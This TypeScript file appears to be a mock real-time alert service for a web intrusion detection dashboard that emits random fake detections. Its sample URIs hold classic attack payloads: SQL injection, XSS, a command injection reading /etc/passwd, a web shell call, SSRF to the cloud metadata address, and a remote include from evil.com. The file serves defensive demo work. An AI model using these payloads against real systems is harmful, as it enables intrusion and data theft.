import type { DetectionResult } from '../types';

const ATTACK_TYPES: DetectionResult['attack_prediction'][] = ['Benign', 'SQLi', 'XSS', 'CMD Injection', 'Directory Traversal', 'Web Shell', 'Credential Stuffing', 'SSRF', 'LFI/RFI'];
const HIGH_SEVERITY_ATTACKS: DetectionResult['attack_prediction'][] = ['SQLi', 'CMD Injection', 'Web Shell', 'Directory Traversal', 'SSRF'];

let nextId = 201; // Start after existing mock DB

const generateMockResult = (): DetectionResult => {
  const attackType = ATTACK_TYPES[Math.floor(Math.random() * ATTACK_TYPES.length)];
  const isAttack = attackType !== 'Benign';
  const timestamp = new Date().toISOString();
  
  const uris = {
    'Benign': `/index.php?page=about`,
    'SQLi': `/api/v1/products?id=1' AND '1'='1`,
    'XSS': `/profile?name=<img src=x onerror=alert(1)>`,
    'CMD Injection': `/tools/ping?host=8.8.8.8; cat /etc/passwd`,
    'Directory Traversal': `/static?file=../../../../boot.ini`,
    'Web Shell': `/uploads/backdoor.php?cmd=whoami`,
    'Credential Stuffing': `/api/login`,
    'SSRF': `/proxy?url=http://169.254.169.254/latest/meta-data/`,
    'LFI/RFI': `/include?page=http://evil.com/shell.txt`
  };

  return {
    id: nextId++,
    timestamp,
    src_ip: `10.0.0.${Math.floor(Math.random() * 254) + 1}`,
    host: 'production-server.com',
    uri: uris[attackType] || '/index.html',
    attack_prediction: attackType,
    confidence: isAttack ? Math.random() * 0.4 + 0.6 : Math.random() * 0.3, // Higher confidence for alerts
    rule_matched: isAttack ? `RT_RULE_${attackType.toUpperCase()}` : null,
    success_flag: isAttack && Math.random() > 0.6,
  };
};

let intervalId: number | null = null;

export const realtimeService = {
  connect: (onAlert: (result: DetectionResult) => void): (() => void) => {
    console.log('Real-time alert service connected.');
    
    intervalId = window.setInterval(() => {
      // There's a 25% chance of a high-severity event being generated per interval
      if (Math.random() < 0.25) {
        let result: DetectionResult;
        // Keep generating until we get a high-severity one to ensure an alert is fired
        do {
            result = generateMockResult();
        } while (!HIGH_SEVERITY_ATTACKS.includes(result.attack_prediction));
        
        console.log('High-severity attack detected:', result);
        onAlert(result);
      }
    }, 7000); // Check for new alerts every 7 seconds

    const disconnect = () => {
      if (intervalId !== null) {
        clearInterval(intervalId);
        intervalId = null;
        console.log('Real-time alert service disconnected.');
      }
    };
    
    return disconnect;
  },
};